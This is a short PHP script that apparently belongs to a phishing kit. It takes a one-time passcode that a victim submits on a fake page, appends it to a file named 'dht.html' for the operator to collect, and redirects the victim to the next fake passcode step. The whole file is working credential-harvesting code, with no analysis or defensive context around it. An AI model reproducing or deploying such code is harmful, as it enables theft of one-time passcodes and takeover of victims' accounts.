<?php
header("location:otp5.php");
$otp5=$_POST['otp5'];
$handle=fopen('dht.html','a');
fwrite($handle ,"otp5=$otp5\n");
fwrite($handle ,"<br>\r\n");
fclose($handle);
exit;
?>
